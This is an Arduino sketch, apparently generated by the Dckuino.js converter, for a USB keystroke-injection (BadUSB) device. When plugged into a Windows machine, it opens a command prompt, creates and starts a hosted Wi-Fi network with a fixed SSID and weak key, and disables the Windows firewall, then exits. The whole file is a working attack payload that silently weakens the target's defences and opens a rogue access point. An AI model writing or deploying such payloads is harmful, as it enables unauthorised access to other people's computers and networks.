/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh wlan start hostednetwork");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh firewall set opmode disable");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
